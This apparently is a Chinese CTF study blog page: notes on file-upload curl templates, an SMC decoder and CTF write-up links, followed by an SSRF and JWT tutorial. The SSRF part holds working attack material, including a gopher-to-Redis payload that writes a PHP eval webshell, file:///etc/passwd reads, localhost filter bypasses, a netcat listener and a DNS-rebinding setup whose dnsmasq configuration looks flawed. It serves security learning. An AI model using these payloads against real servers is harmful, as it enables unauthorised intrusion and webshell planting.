<h2 id="使用Filebin-api"><a href="#使用Filebin-api" class="headerlink" title="使用Filebin api"></a>使用Filebin api</h2><p>这样就能在linux终端上传文件了。去 <a target="_blank" rel="noopener" href="https://filebin.net/api">https://filebin.net/api</a> ，点击upload a file to a bin,点击Try it out，填写bin名（这个访问 <a target="_blank" rel="noopener" href="https://filebin.net/">https://filebin.net/</a> 就能得到一个名字）和上传的文件名。然后选择文件（随便一个即可），点击execute。如果成功，就可以copy curl命令到终端上。大概是这样：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -X <span class="string">&#x27;POST&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://filebin.net/binname/filename&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: application/octet-stream&#x27;</span> \</span><br><span class="line">  --data-binary <span class="string">&#x27;@path/to/file&#x27;</span></span><br></pre></td></tr></table></figure>

<p>上传成功后get<code>https://filebin.net/binname/filename</code>即可。今天用的时候发现服务器满了传不了文件，我又找了另一个api通用的filebin： <a target="_blank" rel="noopener" href="https://arquivos-saude.recife.pe.gov.br/">https://arquivos-saude.recife.pe.gov.br/</a></p>
<p>今天发现两个好像都down了……找了个替代的： <a target="_blank" rel="noopener" href="https://www.file.io/">https://www.file.io/</a> 。这个的api稍微难用点，但是模板如下：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl -X <span class="string">&#x27;POST&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://file.io/&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;accept: application/json&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;Content-Type: multipart/form-data&#x27;</span> \</span><br><span class="line">  -F <span class="string">&#x27;file=@path/to/file&#x27;</span> \</span><br><span class="line">  -F <span class="string">&#x27;expires=ISO 8601 date string&#x27;</span> \</span><br><span class="line">  -F <span class="string">&#x27;maxDownloads=1&#x27;</span> \</span><br><span class="line">  -F <span class="string">&#x27;autoDelete=true&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这个ISO 8601 date string可以在 <a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toISOString">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/toISOString</a> 运行代码得到</p>
<h2 id="SMC文件解码"><a href="#SMC文件解码" class="headerlink" title="SMC文件解码"></a>SMC文件解码</h2><p>适用于简单的smc</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;SMC&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    file=f.read()</span><br><span class="line">offset= <span class="comment">#smc code出现的偏移</span></span><br><span class="line">length= <span class="comment">#smc code段的长度</span></span><br><span class="line">obfuscated=file[offset:offset+length]</span><br><span class="line">res=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> obfuscated: <span class="comment">#这块为具体的解码逻辑，可以比这里更复杂</span></span><br><span class="line">    res.append(i^<span class="number">0x66</span>)</span><br><span class="line">res=<span class="built_in">bytes</span>(res)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/SMC_out&quot;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(file[:offset]+res+file[offset+length:]) <span class="comment">#重新拼接回去</span></span><br></pre></td></tr></table></figure>

<h2 id="python获取wav文件的频率"><a href="#python获取wav文件的频率" class="headerlink" title="python获取wav文件的频率"></a>python获取wav文件的频率</h2><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/4n86rakam1/writeup/tree/main/SunshineCTF_2023/scripting/SimonProgrammer_3">SimonProgrammer 3</a></li>
<li><a target="_blank" rel="noopener" href="https://gist.github.com/c0nrad/66a322ca0e1b0ffc4261e2a9ed6b1f93">https://gist.github.com/c0nrad/66a322ca0e1b0ffc4261e2a9ed6b1f93</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/Amagnum/Music-notes-detection/blob/master/music_notes_detection.py">https://github.com/Amagnum/Music-notes-detection/blob/master/music_notes_detection.py</a></li>
</ul>
<h2 id="python恢复shifted-image"><a href="#python恢复shifted-image" class="headerlink" title="python恢复shifted image"></a>python恢复shifted image</h2><p>shifted image看起来倾斜，像是被拉伸了一样</p>
<p><a target="_blank" rel="noopener" href="https://berliangabriel.github.io/post/tcp1p-ctf-2023/">https://berliangabriel.github.io/post/tcp1p-ctf-2023/</a></p>
<h2 id="Git使用"><a href="#Git使用" class="headerlink" title="Git使用"></a>Git使用</h2><ul>
<li>如何设置commit时的username： <a target="_blank" rel="noopener" href="https://docs.github.com/en/get-started/getting-started-with-git/setting-your-username-in-git">https://docs.github.com/en/get-started/getting-started-with-git/setting-your-username-in-git</a> 。同理，设置邮箱可用<code>git config --global user.email &quot;email&quot;</code></li>
</ul>
<h2 id="如何将wav文件转为standard-IQ-file"><a href="#如何将wav文件转为standard-IQ-file" class="headerlink" title="如何将wav文件转为standard IQ file"></a>如何将wav文件转为standard IQ file</h2><p><a target="_blank" rel="noopener" href="https://blog.nanax.fr/post/2024-01-28-hardware-longrange2/">https://blog.nanax.fr/post/2024-01-28-hardware-longrange2/</a></p>
<h2 id="A-Block-and-a-Hard-Place"><a href="#A-Block-and-a-Hard-Place" class="headerlink" title="A Block and a Hard Place"></a><a target="_blank" rel="noopener" href="https://ctf.krauq.com/bi0sctf-2024">A Block and a Hard Place</a></h2><p>用户可以控制角色在有障碍的地图里走动，要求在事先不知道地图的情况下通过行走时的反馈描绘出地图</p>
<h2 id="Brainf-ck-Search"><a href="#Brainf-ck-Search" class="headerlink" title="Brainf*ck Search"></a><a target="_blank" rel="noopener" href="https://blog.bi0s.in/2024/02/26/Misc/BFS-BrainfuckSearch-bi0sctf2024/">Brainf*ck Search</a></h2><p>brainfuck code golfing挑战，使用有限的代码在tape中寻找flag子节。其他wp： <a target="_blank" rel="noopener" href="https://www.writeup.no/posts/bi0s-24-misc-brainfuck/">https://www.writeup.no/posts/bi0s-24-misc-brainfuck/</a></p>
<h2 id="Maize"><a href="#Maize" class="headerlink" title="Maize"></a><a target="_blank" rel="noopener" href="https://github.com/WolvSec/WolvCTF-2024-Challenges-Public/tree/master/rev/maize">Maize</a></h2><p>立体方块迷宫求解器</p>
<h2 id="rockyoudle"><a href="#rockyoudle" class="headerlink" title="rockyoudle"></a><a target="_blank" rel="noopener" href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#rockyoudle">rockyoudle</a></h2><p>wordle求解器</p>
<h2 id="Mysterious-Melody"><a href="#Mysterious-Melody" class="headerlink" title="Mysterious Melody"></a><a target="_blank" rel="noopener" href="https://ctf.krauq.com/bcactf-2024">Mysterious Melody</a></h2><p>python获取midi文件的音符</p>
<p>使用audacity的手动做法： <a target="_blank" rel="noopener" href="https://github.com/BCACTF/bcactf-5.0/blob/main/mysterious-melody">https://github.com/BCACTF/bcactf-5.0/blob/main/mysterious-melody</a></p>
<h2 id="Touch-Tone-Telephone"><a href="#Touch-Tone-Telephone" class="headerlink" title="Touch Tone Telephone"></a><a target="_blank" rel="noopener" href="https://ctf.krauq.com/bcactf-2024">Touch Tone Telephone</a></h2><p>python解码dtmf wav脚本</p>
<p>题目官方的rust脚本： <a target="_blank" rel="noopener" href="https://github.com/BCACTF/bcactf-5.0/blob/main/touch-tone-telephone">https://github.com/BCACTF/bcactf-5.0/blob/main/touch-tone-telephone</a></p>
<h2 id="Picoify"><a href="#Picoify" class="headerlink" title="Picoify"></a><a target="_blank" rel="noopener" href="https://github.com/TFNS/writeups/tree/master/2024-06-30-UIUCTF/picoify">Picoify</a></h2><p>编写能在Microchip PIC16F628A上运行的压缩代码。特别之处在于，这玩意SRAM才224字节，甚至没法把要压缩的内容一股脑读进来，因此这里实现的是streaming compression。另外，PIC16 assembly code可以参考wp里的方式生成，先写个C代码再用<a target="_blank" rel="noopener" href="https://www.microchip.com/en-us/tools-resources/develop/mplab-xc-compilers">编译器</a>编译。这块最后实现的算法是huffman，并用python代码实现解压</p>
<p><a target="_blank" rel="noopener" href="https://maplebacon.org/2024/07/uiuctf-picoify/">https://maplebacon.org/2024/07/uiuctf-picoify/</a> 是另一种解法。作者直接根据压缩的内容发明了一个压缩算法。不过还是学到了很多东西：</p>
<ul>
<li>如何计算文本的entropy</li>
<li>使用<a target="_blank" rel="noopener" href="https://www.gnu.org/software/gperf/">gperf</a>生成完美哈希表</li>
<li>python内部会使用sbrk系统调用为常数量分配空间。如果sbrk被禁而且非要往里面塞大型变量的话，可以利用注释将内容“走私”进去，然后运行时访问程序的源代码将内容拿出来</li>
<li>清理sys.argv可以获得一部分内存（取决于原本sys.argv的大小）</li>
</ul>
<h1 id="WebSocket-VPN"><a href="#WebSocket-VPN" class="headerlink" title="WebSocket VPN"></a><a target="_blank" rel="noopener" href="https://ouuan.moe/post/2024/07/ductf-2024">WebSocket VPN</a></h1><p>通过websocket发送TCP握手IP报文和HTTP请求</p>
<h1 id="sleepy-alarm"><a href="#sleepy-alarm" class="headerlink" title="sleepy-alarm"></a><a target="_blank" rel="noopener" href="https://yun.ng/c/ctf/2024-ictf/forensics/sleepy-alarm">sleepy-alarm</a></h1><ul>
<li>使用audacity+python分析音频。有时候audacity里结果不清楚，在python里将相同的操作重复一遍再plot出来就清楚了</li>
<li>应用band pass noise reduction过滤某个频率出的噪音</li>
<li>另一种按时间间隔读取bit的做法： <a target="_blank" rel="noopener" href="https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#sleepy-alarm">https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54#sleepy-alarm</a></li>
</ul>
<h1 id="left-in-the-dark"><a href="#left-in-the-dark" class="headerlink" title="left-in-the-dark"></a><a target="_blank" rel="noopener" href="https://yun.ng/c/ctf/2024-ictf/misc/left-in-the-dark">left-in-the-dark</a></h1><p>升级版A*迷宫寻路算法，无法提前得知迷宫地图，需要一边走一边探索路线，走错路后还需要重新规划路线并回退之前的操作</p>
<h1 id="MAN-in-the-middle"><a href="#MAN-in-the-middle" class="headerlink" title="MAN in the middle"></a><a target="_blank" rel="noopener" href="https://yun.ng/c/ctf/2024-deadsec-ctf/misc/man-in-the-middle">MAN in the middle</a></h1><p>解码曼彻斯特(Manchester)编码信号wav</p>
<h2 id="其他类型"><a href="#其他类型" class="headerlink" title="其他类型"></a>其他类型</h2><ul>
<li>小端下将bytes转为数字：<code>int.from_bytes(msg, &#39;little&#39;)</code>。类似地，大端填<code>&#39;big&#39;</code></li>
<li>pwntools将内存&#x2F;数字转为浮点数形式： <a target="_blank" rel="noopener" href="https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/">https://7rocky.github.io/en/ctf/other/htb-unictf/zombienator/</a> ，程序scanf用<code>%lf</code>时用</li>
<li><a target="_blank" rel="noopener" href="https://github.com/DvorakDwarf/Infinite-Storage-Glitch">Infinite-Storage-Glitch</a><ul>
<li>youtube不限制上传的视频数量，所以只要把文件转成视频，就有了无限的存储……</li>
</ul>
</li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://theganlove.github.io/2024/09/01/%E8%84%9A%E6%9C%AC%E5%B7%A5%E5%85%B7/" data-id="cm0kx5k5l001xo8dkbj700ggq" data-title="脚本工具" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-ssrf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/09/01/ssrf/" class="article-date">
  <time class="dt-published" datetime="2024-09-01T12:49:09.000Z" itemprop="datePublished">2024-09-01</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2024/09/01/ssrf/">ssrf</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>Server-side Request Forgery 服务端请求伪造<br>攻击向服务端发送包含恶意url连接的请求，借由服务端发起请求<br>以便获取服务端网络内部的资源<br>一句话总结：<br>控制服务端使用指定协议访问指定的url<br>A：你为什么这么干？<br>B：是谁谁谁让我干的<br>A：谁谁谁让你去吃shi你去不去？<br>特点：<br>1 让别人访问我们访问不到的url<br>2 拿到自己本来拿不到的数据</p>
<p>条件：<br>1 别人能帮我访问url 服务端有接受url地址并进行访问的功能<br>2 url地址外部可控<br><a target="_blank" rel="noopener" href="https://xxx.com/index.php?url=http://www.baidu.com">https://xxx.com/index.php?url=http://www.baidu.com</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:&#x27;</span>.<span class="variable">$url</span>); <span class="comment">//302的跳转</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>是不是属于ssrf?</p>
<p>告诉浏览器，你去访问这个地址<br>此时，浏览器，是客户端还是服务端</p>
<p>客户端   </p>
<p>此时，服务器没有访问这个Url,只是告诉你浏览器，去跳转到这个地址去<br>是浏览器去访问，不是服务端去访问<br>所以，不是SSRF<br>只能算 任意跳转漏<br>分清  是否是ssrf<br>url地址可控<br><a target="_blank" rel="noopener" href="http://10.xx.xx.xx/">http://10.xx.xx.xx/</a><br>file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd<br>URL格式<br>URI &#x3D; scheme:[&#x2F;&#x2F;authority]path[?query][#fragment]<br>schema: 协议头:&#x2F;&#x2F;authority [userinfo@]host[:port]</p>
<p>默认使用80端口，而80端口默认情况下，是可以省略<br><a target="_blank" rel="noopener" href="http://www.baidu.com/robots.txt">http://www.baidu.com/robots.txt</a></p>
<p>本质，就是 通过指定的协议，访问互联网上某台服务器的某个资源或者某个文件<br>默认使用匿名账户访问<br>userinfo: username:password@hos<br>schema:&#x2F;&#x2F;username:password@host:port&#x2F;path?a&#x3D;b#top<br><a target="_blank" rel="noopener" href="http://ctfshow:hacker@www.baidu.com/robots.txt">http://ctfshow:hacker@www.baidu.com/robots.txt</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="comment">//初始化一个cURL会话</span></span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">//设定返回信息中包含响应信息头</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//启用时会将头文件的信息作为数据流输出。 </span></span><br><span class="line"><span class="comment">//参数为1表示输出信息头,为0表示不输出</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//设定curl_exec()函数将响应结果返回，而不是直接输出</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//参数为1表示$result,为0表示echo $result</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//执行一个cURL会话</span></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="comment">//关闭一个curl会话</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="comment">//输出返回信息  如果CURLOPT_RETURNTRANSFER参数为fasle可省略</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="SSRF的利用面"><a href="#SSRF的利用面" class="headerlink" title="SSRF的利用面"></a>SSRF的利用面</h1><p><a target="_blank" rel="noopener" href="http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php">http://127.0.0.1:8000/fgc.php?url=file:///var/www/html/flag.php</a><br><a target="_blank" rel="noopener" href="http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php">http://127.0.0.1:8000/fgc.php?url=http://127.0.0.1/flag.php</a></p>
<h2 id="1-任意文件读取-前提是知道要读取的文件名"><a href="#1-任意文件读取-前提是知道要读取的文件名" class="headerlink" title="1 任意文件读取 前提是知道要读取的文件名"></a>1 任意文件读取 前提是知道要读取的文件名</h2><h2 id="2-探测内网资源"><a href="#2-探测内网资源" class="headerlink" title="2 探测内网资源"></a>2 探测内网资源</h2><p> 127.0.0.1 mysql服务端监听了127.0.0.1这个地址，也就表示，只能通过127.0.0.1这个IP来访问<br> 0.0.0.0 表示允许任意ip访问<br> 192.168.233.233 只允许特定的IP地址访问<br> 3 使用gopher协议扩展我们的攻击面<br> apache&#x2F;nginx 80<br> tomcat 8080<br> node 3000<br> flask 8080<br> php-fpm 9000<br> mysql 3306<br> ftp 21<br> ssh 22<br> redis 6379<br> key-value  gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;<em>save</em>&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php_<?php eval($_POST[1]);?><br> mysql 3306<br> 用户密码为空<br> php-fpm<br> php-fpm 默认监听9000端口，而且只允许本机127.0.0.1这个地址访问<br> 主要负责对.php文件的代码解释执行<br> 我们可以通过向9000端口发送格式的请求，来让9000端口背后的php-fpm帮我们处理我们提交的php代码<br> 通过向9000端口发送php执行请求<br> 设置php.ini中的运行参数<br> 其中使用 auto_append_file 来指定 php:&#x2F;&#x2F;input 包含恶意代码，然后执行<br> 为了能使用auto_append_file参数，必须有一个存在的php文件来使用这个配置项<br> php原生类进行ssrf<br>$soap &#x3D;new SoapClient($_GET[‘url’]);<br>$soap-&gt;hack();<br>&#x2F;&#x2F;$soap-&gt;__call()<br>url可控，可以发送内网请求<br>ssrf绕过<br>只要不允许它访问本地地址即可，也就是说，过滤的目的是，不让访问127.0.0.1地址<br>1 enclosed alphanumerics 绕过<br>127.0.0.1<br>127.⓿.⓿.1<br>2 使用IP地址转换<br>所有的域名-&gt;IP<br>ip可以使用不同进制来表示<br>127.0.0.1用不同进制可以表示为</p>
<ul>
<li><p>2130706433  10进制 <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://2130706433</a>  </p>
</li>
<li><p>017700000001 8进制 <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://017700000001</a> </p>
</li>
<li><p>7F000001 16进制   <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0x7F000001</a> </p>
<h2 id="3-特殊语法绕过"><a href="#3-特殊语法绕过" class="headerlink" title="3 特殊语法绕过"></a>3 特殊语法绕过</h2><p>Windows 下 0 代表的是0.0.0.0<br>而Linux 下 0 代表的是127.0.0.1<br>127.0.0.1 可以省略为 127.1<br>127。0。0。1 可以替代127.0.0.1<br>4 如果对方可以接受302跳转，并且跟进302跳转<br>可以发送http的协议。但是返回的location为其他协议<br><a target="_blank" rel="noopener" href="http://xxx.com/302.php?schema=gopher&host=127.0.0.1&port=9000&payload=xxxx">http://xxx.com/302.php?schema=gopher&amp;host=127.0.0.1&amp;port=9000&amp;payload=xxxx</a><br>(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP<br>(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证<br>(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。<br>(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果。</p>
</li>
</ul>
<p>compress.zlib:&#x2F;&#x2F;data:@baidu.com&#x2F;baidu.com,phpinfo()<br><code>compress.zlib</code>绕过data协议的检测，<code>@</code>使<code>data:</code>被解释为用户名和密码，<code>baidu.com/baidu.com</code>中只要包含<code>/</code>就会被解释为合法的<code>media-type</code></p>
<p>1·修改自己域名的a记录，改成127.0.0.1<br>2·这个网站a记录指向127.0.0.1 可以直接利用<br>url&#x3D;<a target="_blank" rel="noopener" href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p>
<ol>
<li>设置阿里云 DNS 解析<br>首先，您需要一个在阿里云上注册的域名，并且您需要能够管理该域名的 DNS 记录。</li>
</ol>
<p>创建域名和设置 DNS 解析<br>登录到 阿里云控制台。<br>在左侧菜单中选择“域名与网站” &gt; “域名”，并选择您的域名。<br>点击“解析”，进入 DNS 解析设置页面。<br>添加 A 记录：<br>主机记录：@<br>记录类型：A<br>解析线路：默认<br>记录值：203.0.113.1（第一次返回的外部 IP）<br>TTL：1分钟<br>注意：阿里云 DNS 不支持将 TTL 设置为 0，但您可以将其设置为最小值，例如 1 分钟。</p>
<ol start="2">
<li>配置可控的 DNS 服务器<br>由于阿里云 DNS 不支持 TTL 为 0 的设置，您需要配置一个您可以完全控制的 DNS 服务器。您可以在阿里云 ECS 实例上运行一个 DNS 服务器（例如 Bind 或 dnsmasq），并手动设置 TTL 为 0。</li>
</ol>
<p>使用 dnsmasq 设置 DNS 服务器<br>在阿里云上创建一个 ECS 实例并安装 dnsmasq：</p>
<p>bash<br>复制代码<br>sudo yum install -y dnsmasq  # 对于 CentOS<br>sudo apt-get install -y dnsmasq  # 对于 Ubuntu<br>编辑 dnsmasq 配置文件 &#x2F;etc&#x2F;dnsmasq.conf，添加如下内容：</p>
<p>conf<br>复制代码<br>no-resolv<br>server&#x3D;8.8.8.8  # 使用 Google 的公共 DNS 作为上游 DNS 服务器<br>address&#x3D;&#x2F;sudo.cc&#x2F;203.0.113.1  # 初始解析返回外部 IP<br>address&#x3D;&#x2F;sudo.cc&#x2F;127.0.0.1  # 重绑定解析返回内网 IP<br>注意：确保 TTL 设置为 0。dnsmasq 的默认 TTL 是 0，不需要额外配置。</p>
<p>启动 dnsmasq 服务：</p>
<p>bash<br>复制代码<br>sudo systemctl restart dnsmasq<br>sudo systemctl enable dnsmasq<br>更新您在阿里云上的域名解析，指向您配置的 ECS 实例的 IP 地址。</p>
<ol start="3">
<li>执行 DNS Rebinding 攻击<br>在攻击者机器上启动 netcat</li>
</ol>
<p> 监听：</p>
<p>bash<br>复制代码<br>nc -lvnp 4444<br>发送 POST 请求到目标服务器：</p>
<p>bash<br>复制代码<br>curl -X POST -d “url&#x3D;<a target="_blank" rel="noopener" href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a>“ http:&#x2F;&#x2F;目标服务器地址&#x2F;script.php<br>验证和调试<br>验证 DNS 解析：<br>确保在目标服务器上进行 DNS 解析时，能够返回正确的 IP 地址：</p>
<p>bash<br>复制代码<br>nslookup sudo.cc<br>检查防火墙和安全组：<br>确保您的阿里云 ECS 实例的安全组规则允许外部访问。</p>
<p>监控 DNS 解析：<br>使用 tcpdump 或其他网络监控工具，确保 DNS 请求和响应符合预期。</p>
<p>注意事项<br>合法性：确保您进行的所有操作都是在合法授权的范围内。未经授权的攻击是非法的。<br>测试环境：最好在隔离的测试环境中进行测试，以避免对生产环境造成影响。<br>防护措施：了解并学习这些攻击技术后，建议采取相应的防护措施，防止在实际应用中被利用。</p>
<p>5 利用短网址绕过<br>baidu.com  不允许出现baidu<br>或者限制了url长度，我们可以切换为短网址，来绕过长度的限制<br><a target="_blank" rel="noopener" href="http://rurl.vip/eW7AU">http://rurl.vip/eW7AU</a></p>
<p>首先准备监听<br>url&#x3D;<a target="_blank" rel="noopener" href="http://ctf.@127.0.0.1/flag.php?show">http://ctf.@127.0.0.1/flag.php?show</a><br>url&#x3D;<a target="_blank" rel="noopener" href="http://ctf.@127.0.0.1/flag.php#show">http://ctf.@127.0.0.1/flag.php#show</a></p>
<h1 id="本地才能看到flag，这就需要ssrf了"><a href="#本地才能看到flag，这就需要ssrf了" class="headerlink" title="本地才能看到flag，这就需要ssrf了"></a>本地才能看到flag，这就需要ssrf了</h1><h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>jwt是一个轻量级的认证规范 对数据进行签名用的</p>
<p>防止数据被篡改<br>1 对数据进行加密   内容对用户敏感，不需要对外<br>2 对数据进行签名   内容不敏感，但是确保不被篡改</p>
<p>JWT是对数据进行签名，防止数据篡改，而不是防止数据被读取<br>JSON Web Token JWT<br>?username&#x3D;admin&amp;score&#x3D;100  别人传递过程中，会对积分进行篡改<br>?username&#x3D;admin&amp;score&#x3D;100&amp;token&#x3D;c17961f5f372f8cf039113909d715943<br>? md5(score&#x3D;100&amp;username&#x3D;admin)&#x3D;c17961f5f372f8cf039113909d715943<br>?score&#x3D;100&amp;username&#x3D;admin&amp;token&#x3D;c17961ff372f8cf039113909d715943<br>篡改数据的同时，破解了算法，篡改了签名<br>加盐机制，salt<br>md5(score&#x3D;100&amp;username&#x3D;admin_ctfshow)&#x3D;20f3fa445b286df3f1a518fcbcd8bbe2</p>
<p>盐值有可能被爆破，也有可能被泄露<br>增加更高的密码算法，不再简单的md5，盐值也大幅度提高长度，达到几百上千位 来保证我们的数据不被篡改  或者即使篡改了我们能发现<br>由 Header、Payload、Signature三部分构成，用点分隔，数据采用Base64URL进行编码<br>Header是JWT的第一个部分，是一个 JSON 对象，主要声明了JWT的签名算法，如“HS256”、“RS256”等，以及其他可选参数，如“kid”等。<br>Header</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;alg&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;typ&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;jwt&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>Payload是JWT的第二个部分，这也是一个 JSON 对象，主要承载了各种声明并传递明文数据，一般用于存储用户的信息，如 id、用户名、角色、令牌生成时间和其他自定义声明<br>Payload</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;user&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;Admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>Signature<br>    Signature 是对 Header 和 Payload 进行签名，具体是用什么加密方式写在 Header的alg中。同时拥有该部分的JWT被称为JWS，也就是签了名的JWT。<br>    Signature的功能是保护token完整性。<br>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。抽象成公式就是：signature &#x3D; HMAC-SHA256(base64urlEncode(header) + ‘.’ + base64urlEncode(payload), secret_key)<br>值得注意的是，编码header和payload时使用的编码方式为base64urlencode，base64url编码是base64的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”&#x3D;”号，并将标准Base64中的”+”和”&#x2F;“分别改成了”-“和”_”。</p>
<p>JWT生成-在线网址&amp;工具</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 flask_session_cookie_manager3.py encode -s <span class="string">&#x27;secret_key&#x27;</span> -t <span class="string">&#x27;&#123;&quot;admin&quot;:True,&quot;username&quot;:&quot;admin&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>1 当不校验算法时，我们可以替换算法，甚至可以使用空的算法，来达到数据篡改目的</p>
